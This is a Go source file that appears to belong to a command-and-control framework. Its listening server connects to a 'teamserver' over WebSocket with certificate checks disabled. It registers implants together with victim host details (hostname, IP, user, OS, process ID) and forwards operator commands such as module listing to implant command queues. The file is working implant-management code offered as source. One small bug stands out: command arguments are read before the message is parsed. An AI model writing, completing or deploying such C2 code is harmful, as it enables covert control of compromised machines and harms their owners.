package ListeningServer

import (
	"AllSecure/ListeningServer/Common"
	"crypto/tls"
	"encoding/json"
	"github.com/gorilla/websocket"
	"log"
	"net/http"
	"strings"
)

func CreateWebSocketConnection() (*websocket.Conn, error) {

	var (
		token   []byte
		err     error
		headers http.Header
	)

	endpoint := "wss://" + g_clientobj.Server + "/ws"
	token, err = json.Marshal(g_clientobj.Cookie.Token.JwtToken)
	if err != nil {
		log.Println("[error] attempting to marshal JWT token")
		return nil, err
	}
	//set our request authorization header to be our jwt  token.
	headers = make(http.Header)
	headers.Set("Authorization", strings.Trim(string(token), "\""))
	websocket.DefaultDialer.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	conn, _, err := websocket.DefaultDialer.Dial(endpoint, headers)
	if err != nil {
		log.Println("[error] attempting to make websocket connection", err)
		return nil, err
	}

	return conn, nil
}

func StartEventHandler(token string, teamserver string) error {
	var err error
	g_clientobj.Cookie.Token.JwtToken = token
	g_clientobj.Server = teamserver
	g_clientobj.Conn, err = CreateWebSocketConnection()
	if err != nil {
		log.Println("[error] attempting to create websocket connection", err)
		return err
	}
	go RecvEvent()

	return nil
}

func SendEvent(EventName string, ImpCtx Common.ImplantContext) error {
	var NewMessage Common.NewWebSocketMessage
	var err error

	switch EventName {
	case "RegisterImplant":
		var NewImplant Common.ImplantData
		var TempData []byte

		NewMessage.MessageType = "RegisterImplant"
		NewImplant.ImplantId = ImpCtx.Agent_id
		NewImplant.ImplantName = ImpCtx.Agent_name
		NewImplant.Computer = ImpCtx.Host_name
		NewImplant.InternalIP = ImpCtx.Ip_addr
		NewImplant.ExternalIP = ImpCtx.Ip_addr
		NewImplant.User = ImpCtx.User_name
		NewImplant.Health = true
		NewImplant.OS = Common.GetWindowsVersion(ImpCtx.Os_info)
		NewImplant.Process = ImpCtx.Process_name
		NewImplant.PID = ImpCtx.Process_id
		TempData, err = json.Marshal(NewImplant)
		if err != nil {
			log.Println("[error] attempting to marshal the implant data", err)
			return err
		}
		NewMessage.Message = string(TempData)
		err = g_clientobj.Conn.WriteJSON(NewMessage)
		if err != nil {
			log.Println("[error] attempting to send implant data to the team server web socket connection", err)
			return err
		}
	}
	return nil
}

func RecvEvent() {
	var (
		NewWSMessage Common.NewWebSocketMessage
		err          error
	)
	for {
		err = g_clientobj.Conn.ReadJSON(&NewWSMessage)
		if err != nil {
			log.Println("[error] attempting to read web socket message ", err)
			continue
		}
		switch NewWSMessage.MessageType {

		case "GetActiveImplants":
			for _, agent := range agent_arr {
				if agent.Alive {
					err = SendEvent("RegisterImplant", agent.Context)
					if err != nil {
						log.Println("[error] attempting to send implant data to the team server web socket connection", err)
						continue
					}
				}
			}
			break // GET ACTIVE IMPLANTS

		case "ImplantCommand":
			var ImplantCmd Common.ImplantCommandData
			var AgentCmd Common.AgentCmd
			var DataBuf []byte

			for _, str := range ImplantCmd.Args {
				DataBuf = append(DataBuf, []byte(str+" ")...)
			}

			err = json.Unmarshal([]byte(NewWSMessage.Message), &ImplantCmd)
			if err != nil {
				log.Println("[error] attempting to unmarshal the implant command data", err)
				continue
			}
			switch ImplantCmd.Command {
			case "lm":
				AgentCmd.CmdID = Common.CMD_LIST_MODULES
				AgentCmd.RequestID = 69
				AgentCmd.DataBuffer = DataBuf
				break

			default:
				break
			}

			for _, agent := range agent_arr {
				if agent.Context.Agent_name == ImplantCmd.ImplantName {
					log.Println("[info] attempting to send command [%s] to agent [%s]", ImplantCmd.Command, agent.Context.Agent_name)
					agent.CmdQue.Enqueue(AgentCmd)
				}
			}

			break // IMPLANT COMMAND

		default:
			break // DEFAULT
		}
	}
}
